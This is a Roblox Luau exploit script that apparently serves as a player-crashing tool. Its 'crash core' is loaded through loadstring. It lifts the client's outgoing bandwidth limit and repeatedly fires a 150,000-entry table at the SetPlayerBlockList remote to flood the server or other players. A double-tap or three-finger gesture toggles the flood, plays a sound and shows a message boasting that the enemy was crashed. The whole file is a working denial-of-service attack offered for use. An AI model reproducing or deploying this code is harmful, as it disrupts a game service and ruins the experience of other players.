local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService       = game:GetService("RunService")
local RS               = game:GetService("ReplicatedStorage")

local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ─── CRASH CORE ───────────────────────────────────────────────────────────────
local SRC = [==[
local RunService = game:GetService("RunService")

local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false

local state = {
    running = false,
    thread  = nil,
    remote  = nil,
    cache   = nil,
    pad     = "",
}

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

state.remote = resolve()

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end

local function start()
    if state.running then return end
    state.running = true
    state.cache   = nil
    state.thread  = task.spawn(function()
        while state.running do
            pcall(fire)
            if FrameDelay > 0 then
                task.wait(FrameDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache  = nil
end

return {
    start     = start,
    stop      = stop,
    toggle    = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
]==]

local loader = coroutine.create(function()
    local chunk = loadstring(SRC)
    if not chunk then return end
    local ok, api = pcall(chunk)
    if ok and type(api) == "table" then
        _G.__MOB_INV = api
    end
end)
coroutine.resume(loader)
loader = nil

local api = _G.__MOB_INV
_G.__MOB_INV = nil

-- ─── ANNOUNCE ─────────────────────────────────────────────────────────────────
local function resolveNotifyRemote()
    if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
    local Net = RS:FindFirstChild("Packages") and RS.Packages:FindFirstChild("Net")
    if not Net then return nil end
    if getconnections and debug then
        local getinfo = debug.getinfo or debug.info
        for _, d in ipairs(Net:GetDescendants()) do
            if d:IsA("RemoteEvent") then
                local ok, cs = pcall(getconnections, d.OnClientEvent)
                if ok then
                    for _, c in ipairs(cs) do
                        local f, fn = pcall(function() return c.Function end)
                        if f and type(fn) == "function" and getinfo then
                            local i, info = pcall(getinfo, fn)
                            if i and tostring(info.short_src or info.source or ""):find("NotificationController", 1, true) then
                                return d
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

local notifyRemote = resolveNotifyRemote()

local function announce(msg)
    if notifyRemote and typeof(firesignal) == "function" then
        pcall(firesignal, notifyRemote.OnClientEvent, msg, 6, "Sounds.Sfx.Blop", "Top", 2678001507)
    else
        local old = playerGui:FindFirstChild("_InvAnnounce")
        if old then old:Destroy() end
        local sg = Instance.new("ScreenGui")
        sg.Name           = "_InvAnnounce"
        sg.ResetOnSpawn   = false
        sg.DisplayOrder   = 999
        sg.IgnoreGuiInset = true
        sg.Parent         = playerGui

        local lbl = Instance.new("TextLabel", sg)
        lbl.Size                   = UDim2.new(1, -32, 0, 50)
        lbl.Position               = UDim2.new(0, 16, 0, 70)
        lbl.BackgroundTransparency = 1
        lbl.Font                   = Enum.Font.GothamBlack
        lbl.TextSize               = 15
        lbl.TextWrapped            = true
        lbl.TextColor3             = Color3.fromRGB(255, 70, 70)
        lbl.TextStrokeTransparency = 0
        lbl.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
        lbl.Text                   = msg
        lbl.TextXAlignment         = Enum.TextXAlignment.Center

        task.delay(5, function()
            if sg and sg.Parent then sg:Destroy() end
        end)
    end
end

-- ─── SOUND ────────────────────────────────────────────────────────────────────
local SONG_ID   = 828172750
local songSound = nil

local function playSound(id)
    if songSound then
        pcall(function() songSound:Stop(); songSound:Destroy() end)
        songSound = nil
    end
    local s              = Instance.new("Sound")
    s.SoundId            = "rbxassetid://" .. tostring(id)
    s.Volume             = 1
    s.Looped             = false
    s.RollOffMaxDistance = 0
    s.Parent             = workspace.CurrentCamera
    songSound            = s
    pcall(function() s:Play() end)
end

-- ─── CRASH STATE ──────────────────────────────────────────────────────────────
local crashActive = false

local function activateCrash()
    if crashActive then return end
    crashActive = true
    if api and api.start then pcall(api.start) end
    playSound(SONG_ID)
    announce("You crashed the enemy using leak's anti lose! Keep your Brainrot at your base.")
end

local function deactivateCrash()
    if not crashActive then return end
    crashActive = false
    if api and api.stop then pcall(api.stop) end
    if songSound then
        pcall(function() songSound:Stop(); songSound:Destroy() end)
        songSound = nil
    end
end

-- ─── DOUBLE TAP DETECTION — ANYWHERE ON SCREEN ────────────────────────────────
-- usa 3 dedos simultaneos como double tap pra nao conflitar com controles do jogo
-- ou 2 taps rapidos com 1 dedo em menos de 350ms
-- fica a escolha: MODO = "doubletap" ou "threefinger"
local MODO          = "doubletap"   -- troca pra "threefinger" se quiser
local TAP_THRESHOLD = 0.35          -- segundos entre os 2 taps

local lastTap   = 0
local tapCount  = 0

if MODO == "doubletap" then

    UserInputService.TouchTapInWorld:Connect(function(position, processedByUI)
        -- ignora se o tap foi em cima de UI
        if processedByUI then return end

        local now = tick()
        if (now - lastTap) <= TAP_THRESHOLD then
            -- double tap confirmado
            tapCount = 0
            lastTap  = 0
            if not crashActive then
                activateCrash()
            else
                deactivateCrash()
            end
        else
            tapCount = 1
            lastTap  = now
        end
    end)

elseif MODO == "threefinger" then

    -- detecta 3 dedos na tela ao mesmo tempo
    local activeTouches = {}

    UserInputService.InputBegan:Connect(function(inp, gameProcessed)
        if inp.UserInputType == Enum.UserInputType.Touch then
            activeTouches[inp] = true
            local count = 0
            for _ in pairs(activeTouches) do count += 1 end
            if count >= 3 then
                -- limpa pra nao disparar multiplas vezes
                activeTouches = {}
                if not crashActive then
                    activateCrash()
                else
                    deactivateCrash()
                end
            end
        end
    end)

    UserInputService.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.Touch then
            activeTouches[inp] = nil
        end
    end)

end

-- ─── CLEANUP ──────────────────────────────────────────────────────────────────
player.AncestryChanged:Connect(function()
    pcall(deactivateCrash)
end)